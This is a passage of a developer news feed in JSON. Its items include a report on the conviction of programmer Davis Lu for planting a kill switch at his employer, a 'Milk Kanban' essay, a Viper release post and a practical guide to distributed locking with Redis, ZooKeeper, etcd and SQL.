href=\"https://www.justice.gov/usao-ndoh/pr/texas-man-formerly-employed-ohio-company-convicted-damaging-source-code-and-deleting\" rel=\"noopener ugc nofollow\" target=\"_blank\">sentenced to 10 years in jail</a> for pulling a “kill switch” on his employer EATON Corporation where he was employed as a Senior Software Developer for Emerging Technologies <a href=\"https://www.theregister.com/2025/03/08/developer_server_kill_switch/\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a><a href=\"https://regmedia.co.uk/2025/03/07/lu.pdf\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>. Davis build apps that would regularly execute a method called “IsDLEnabledinAD” which stands for “Is Davis Lu enabled in Active Directory”. Once that method failed, his apps would wreak havoc on the systems of his employer.</p><p>When Davis Lu was laid off on September 9th, 2019 his “secret server” in Kentucky started to administer his evil plans. It reaked havoc when his account was removed from the company’s Active Directory. His hidden server housed dozens of Java apps, some going by the name of “Hakai” 破壊 <em>(Japanese for “destruction”)</em> and “Hūnshuì” 昏睡 . Lu’s fellow coworkers found the kill switch after his termination when the apps already interrupted thousands of company users and systems causing severe financial damage to his former employer.</p><blockquote><p>“Sadly, Davis Lu used his education, experience, and skill to purposely harm and hinder not only his employer and their ability to safely conduct business, but also stifle thousands of users worldwide,” <em>— FBI Special Agent, Greg Nelsen</em></p></blockquote>","contentLength":1246,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jby4uu/fired_kill_switch_programmer_faces_10_years_in/"},{"title":"Is there a Nodejs library you wish existed for Golang?","url":"https://www.reddit.com/r/golang/comments/1jby40e/is_there_a_nodejs_library_you_wish_existed_for/","date":1742053901,"author":"/u/prisencotech","guid":362,"unread":true,"content":"<div><p>People often cite the availability of third party libraries for Node as the reason to prefer it over Golang. Has anyone run into a time when they had to use Node or made do without because a third party library didn't exist?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/prisencotech\"> /u/prisencotech </a>","contentLength":259,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Show HN: A personal YouTube frontend based on yt-dlp","url":"https://github.com/christian-fei/my-yt","date":1742053542,"author":"modmodmod","guid":135,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43373242"},{"title":"Show HN: Fashion Shopping with Nearest Neighbors","url":"https://vibewall.shop/","date":1742052801,"author":"unixpickle","guid":134,"unread":true,"content":"<div>An error has occurred while loading the content.</div>","contentLength":48,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43373163"},{"title":"Milk Kanban","url":"https://brodzinski.com/2025/03/milk-kanban.html","date":1742052722,"author":"ladronevincet","guid":145,"unread":true,"content":"<p>When people say Kanban, they tend to think of a specific set of practices. Whiteboards &amp; sticky notes (both almost universally virtual). Tasks moving through columns that represent workflow. Every now and then, WIP limits even.</p><p>As often as we do it with other things, it reduces a broader principle to a set of oversimplified techniques, which, in turn, tend to underdeliver in many contexts.</p><p>In its original meaning, Kanban represented a visual signal. The thing that communicated, well, something. It might have been a need, option, availability, capacity, request, etc.</p><p>In our Kanban systems, the actual Kanban is a sticky note.</p><p>It represents work, and given its closest environment (board, columns, other stickies, visual decorators), it communicates what needs, or needs not, to be done.</p><p>If it’s yellow, it’s a regular feature. If there’s a blocker on it, it requests focus. If there’s a long queue of neighbors, it suggests flow inefficiency. If it’s a column named “ready for…” it communicates available work and/or handoff.</p><p>A visual signal all the way.</p><p>Let’s decouple ourselves from the most standard Kanban board design. Let’s forget columns, sticky notes, and all that jazz.</p><p>Enters Kasia, our office manager at Lunar. One of the many things Kasia takes care of is making sure we don’t run out of kitchen supplies. The tricky part is that when you don’t drink milk yourself, it becomes a pain to check the cupboard with milk reserves every now and then to ensure we’re stocked.</p><p>Then, one day, I found this.</p><p>A simple index card taped to the last milk carton in a row stating, “Bring me to Kasia.” That’s it.</p><p>In the context, it really says that:</p><ul><li>we’re running out of (specific kind of) milk</li><li>there’s enough time to make an order (we don’t drink that much of cappuccinos and macchiatos)</li></ul><p>But it’s just a visual signal. Kanban at its very core.</p><p>What Kasia designed is a perfect Kanban system. It relies on visual signals, which are put in the context. Even better, unlike most Kanban boards I see across teams, the system is self-explanatory. Everything one needs to know is written on the index card.</p><p>It’s a safe assumption that, almost always, there’s a simpler visualization that would work just as well. We, process designers, often fall into the trap of overengineering our tools.</p><p>And it’s a healthy wake-up call when someone who knows close to nothing about our fancy stuff designs a system that we would unlikely think of. One that is a perfect implementation of the original spirit, even if it doesn’t follow any of the common techniques.</p><p>That’s what we can learn from Milk Kanban.</p>","contentLength":2624,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43373157"},{"title":"New Viper release with major improvements","url":"https://www.reddit.com/r/golang/comments/1jbx8d6/new_viper_release_with_major_improvements/","date":1742051515,"author":"/u/sagikazarmark","guid":365,"unread":true,"content":"<p>It comes with a number of improvements:</p><ul><li>Heavily reduced number of third-party dependencies</li><li>New encoding layer for custom encoding formats</li><li>BREAKING: dropped HCL, INI and Java properties from the core (still possible to use through external libraries)</li><li>New file search API allows customizing how Viper looks for config files</li></ul><p>These features has been around for some time in alpha releases, though I haven't received a lot of feedback, so I'm posting here now in the hope that people using Viper will give some after upgrading.</p><p>I worked hard to minimize breaking changes, but it's possible some slipped in. If you find any, feel free to open an issue.</p>","contentLength":640,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Distributed Locking: A Practical Guide","url":"https://www.architecture-weekly.com/p/distributed-locking-a-practical-guide","date":1742051423,"author":"/u/Adventurous-Salt8514","guid":407,"unread":true,"content":"<p><strong>Was your data ever mysteriously overwritten? No? Think again. Have you noticed conflicting updates to the same data?</strong></p><p><strong>In distributed systems, coordination is crucial. </strong></p><p><strong>A distributed lock ensures that if one actor (node, service instance, etc.) changes a shared resource—like a database record, file, or external service—no other node can step in until the first node is finished.</strong></p><p>Today, we’ll try to discuss it and:</p><ol></ol><p>By the end, you should have a decent grasp of distributed locks, enough to make informed decisions about whether (and how) to use them in your architecture.</p><p><strong>who’s in charge of updating shared data?</strong></p><p>For example, you might have:</p><ul><li><p><strong>Multiple Writers are updating the same table row.</strong><strong>That’s a common issue when updating read models.</strong></p></li></ul><p>Without locks, you can get unpredictable states - like a read model flipping from correct to incorrect or a file partially overwritten by multiple workers. Locks sacrifice a bit of parallelism for the certainty that no two nodes update the same resource simultaneously. In many cases, that’s the safest trade-off, especially if data correctness is paramount.</p><p><a href=\"https://event-driven.io/en/idempotent_command_handling/\" rel=\"\">idempotent actions</a><a href=\"https://www.architecture-weekly.com/p/the-write-ahead-log-a-foundation\" rel=\"\">write-ahead logs</a></p><ol><li><ul><li><p>If no lock currently exists, the node creates one, for instance by setting a Redis key with a time-to-live or by creating an ephemeral zNode in ZooKeeper.</p></li><li><p>If another node is holding the lock, this node either waits, fails immediately, or retries, depending on your chosen policy.</p></li></ul></li><li><p><strong>Crash or Automatic Release</strong></p></li></ol><p>The basic flow would look like:</p><p>And the acquisition part with TTL handling:</p><p>There are many tools for distributed locking; let's check the most popular for certain categories.</p><ul><li><p><strong>Kubernetes Single-Instance</strong></p></li></ul><p>Distributed locks all share a common goal: ensure only one node does a particular thing at any given time. However, each tool mentioned approaches the problem with distinct designs, strengths, and failover behaviours.</p><p>Let’s look at each tool’s big-picture purpose—why you’d even consider it—then move on to how it implements (or approximates) a lock. Lastly, let’s discuss a few technical details that matter once you start coding or troubleshooting.</p><p><strong>Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through.</strong></p><p><strong>Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through. </strong></p><p>To create a lock, you need to create a “lock key” using a Redis command, for instance:</p><pre><code>SET lockKey node123 NX EX 30</code></pre><p>That looks cryptic, but let’s see what’s happening behind the scenes:</p><ol><li><p><strong>Atomic Key Creation with NX. </strong></p></li><li><p><code>SET lockKey node123 NX EX 30</code></p></li><li><p><code>SET lockKey node123 NX EX 30</code></p></li><li><p><strong>Handling Network Partitions. </strong><a href=\"https://redis.io/docs/latest/develop/use/patterns/distributed-locks/\" rel=\"\">Redlock algorithm</a></p></li></ol><p>Choosing Redis may be a good option if you already run a Redis cluster for caching or need a lightweight solution that’s easy to integrate. </p><p>Performance is generally good, though absolute consistency under partitions can require more complex setups.</p><p><strong>ZooKeeper and etcd each run as a cluster of nodes that keep data consistent across a majority of them (a quorum).</strong></p><p><strong>You create something like </strong><strong> in ZooKeeper or a key in etcd.</strong></p><p><strong>When you’re done, you delete the ephemeral node or lease key, signalling that source is available.</strong></p><p>Other clients can “watch” that lock path. If the lock holder crashes, ZooKeeper or etcd detects the session loss and removes the node, instantly notifying watchers that the lock is free again. This allows any waiting client to move in and grab the lock right away.</p><p>If a node is isolated from the quorum, ZooKeeper or etcd eventually considers that session dead and removes the ephemeral node. This auto-frees the lock. The newly updated cluster state reflects that the lock is available, so another node can pick it up.</p><p>If your environment already depends on them for cluster metadata or leader election, reusing them for locks is natural. They replicate data across multiple servers, so updates to the lock state are consistent, reducing the risk of split-brain scenarios. The ephemeral mechanism automatically frees locks if a session dies, so you don’t end up with “zombie” locks after crashes.</p><p><strong>They offer stronger consistency guarantees at the cost of heavier operational overhead compared to Redis.</strong></p><p>Sometimes you’d rather avoid setting up additional infrastructure, like Redis or ZooKeeper, and simply rely on the single relational database you already use. Many SQL databases—PostgreSQL, MySQL, SQL Server, and others—provide built-in locking features that can help you coordinate concurrency directly in your existing environment. There are generally two ways to handle locks in a relational database: </p><ul></ul><p><em>“I want exclusive access to something”</em></p><ol></ol><p>They serve different needs, but both let you say, “I want exclusive access to something,” using your existing DB.</p><p>You can lock specific rows in a table by issuing something like:</p><pre><code><code>BEGIN;\nSELECT * FROM locks WHERE lock_id = @loc_key FOR UPDATE;\n/* make changes */\nCOMMIT;\n</code></code></pre><p>That looks cryptic, but here’s what’s happening. </p><p><em>“Lock this row so nobody else can modify it until I’m done.”</em></p><p><strong>The lock lasts until you commit or roll back the transaction.</strong></p><p>You may also use regular rows instead of a dedicated locks table. It’s natural if your concurrency problem revolves around specific table rows. For others you need to define key that would represent the scope of locking</p><pre><code><code>-- PostgreSQL\nSELECT pg_advisory_lock(12345);\n/* do something exclusive */\nSELECT pg_advisory_unlock(12345);\n</code></code></pre><pre><code><code>-- MySQL\nSELECT GET_LOCK('readModel', 10);\n/* do something exclusive */\nSELECT RELEASE_LOCK('readModel');\n</code></code></pre><p><a href=\"https://www.postgresql.org/docs/current/explicit-locking.html#ADVISORY-LOCKS\" rel=\"\">PostgreSQL Advisory Locks</a></p><p>In many cases, database locks require minimal setup. There’s no need to spin up Redis or ZooKeeper if you already trust a single relational DB for everything. You can use familiar SQL, which can benefit many developers. You get transaction integrations.</p><p><strong>Still, they’re tight to a single database scope.</strong></p><p><strong>The other downside is lock contention.</strong></p><p><strong>You also can get deadlocks</strong></p><p>Sometimes, you don’t need a distributed lock at all—you just need to ensure there’s no possibility of concurrency. In Kubernetes, you can tell the cluster to run exactly one replica of your service. With only one pod, you don’t risk two pods writing to the same resource simultaneously. This approach is straightforward but also very limiting.</p><ul><li><p><a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/\" rel=\"\">StatefulSet</a></p></li><li><p><strong>No Parallelism or scaling</strong></p></li></ul><p><strong><a href=\"https://etcd.io/\" rel=\"\">etcd</a></strong><a href=\"https://etcd.io/\" rel=\"\">etcd</a></p><p><strong>In Kubernetes, the mechanisms and controllers designed to manage the number of pods are quite robust, but in highly dynamic or unusual situations, there might be brief moments where conditions could lead to more than one pod being created temporarily.</strong></p><ul><li><p><strong>Rapid Scale-Up and Scale-Down:</strong></p></li><li><p><strong>Network Partitions or etcd Availability Issues:</strong></p></li></ul><p><strong>Why You’d Choose Single-Instance in Kubernetes?</strong></p><p>If you just need to enforce that there’s a single instance processing background job (read model handling, job processing) and you have Kubernetes set up, then it’s a decent choice. You remove the concurrency at all. You don’t spin up Redis or ZooKeeper just to handle locks.</p><p><strong>Still, the race conditions can be dangerous for high traffic or important cases. It’s not fully reliable.</strong></p><p>Here’s my recommended decision-making scheme for locking mechanism:</p><ol><li><p><strong>If you have a single relational DB handling all app state, advisory locks might suffice</strong></p></li><li><p><strong>If your environment already includes a Redis cluster for caching and you want a simpler ephemeral lock, Redis is a natural fit.</strong></p></li><li><p><strong>If concurrency is never desired or is completely out of scope for a specific microservice, AND you’re using already Kubernetes a single-instance Kubernetes approach may be acceptable.</strong></p></li><li><p><strong>If your microservices need advanced coordination (like leader election, watchers, or strongly consistent state), consider ZooKeeper or etcd. </strong></p></li></ol><p>If your system needs to acquire multiple locks at once, you risk deadlocks (e.g., process A has Lock1 and wants Lock2; process B has Lock2 and wants Lock1). The best practice is to lock in a consistent order globally or use carefully designed transaction boundaries. I’ll show you next week how you could use queuing and single writer for that.</p><p>Locks serialize access. If too many services fight for the same lock, your system effectively becomes single-threaded. To avoid bottlenecks, lock only the smallest critical sections. If concurrency at some granularity is acceptable, consider sharding or partitioned locks.</p><ul></ul><p>If you rely on a single Redis instance or a single ZooKeeper node, your lock manager can fail. Always consider using a clustered or highly available setup, such as Redis with sentinel or cluster mode or a ZooKeeper ensemble of three or five nodes.</p><p>Systems like Redlock try to handle partial failures, but no distributed lock can be 100% guaranteed if your network is severely partitioned (CAP theorem territory). You might end up with multiple holders, each believing they’re the only one. Proper design, timeouts, and conflict detection help reduce these edge cases.</p><ol><li><p><strong>Try to avoid distributed locking if you can. </strong></p></li></ol><p>Distributed systems will always have complexities, but a well-implemented distributed lock (or a strategic single-instance approach) can tame the chaos of concurrency—keeping your data consistent and your architecture stable.</p><p><strong>What are your experiences, use cases, and challenges with distributed locking?</strong></p><p>And hey, all the best for Christmas if you celebrate it. If you don’t, try to also get the chance to rest a bit. And if you  don’t want to, that’s fine, as long as you’re happy!</p><p><strong>p.s. Ukraine is still under brutal Russian invasion. A lot of Ukrainian people are hurt, without shelter and need help.</strong><a href=\"https://savelife.in.ua/en/donate/\" rel=\"\">Ukraine humanitarian </a><a href=\"https://www.gofundme.com/f/help-to-save-the-lives-of-civilians-in-a-war-zone\" rel=\"\">Ambulances for Ukraine</a><a href=\"https://redcross.org.ua/en/\" rel=\"\">Red Cross</a></p>","contentLength":9564,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jbx75z/distributed_locking_a_practical_guide/"},{"title":"Show HN: Web Audio Spring-Mass Synthesis","url":"https://blog.cochlea.xyz/string.html","date":1741987645,"author":"cochlear","guid":133,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43367482"}],"tags":["dev"]}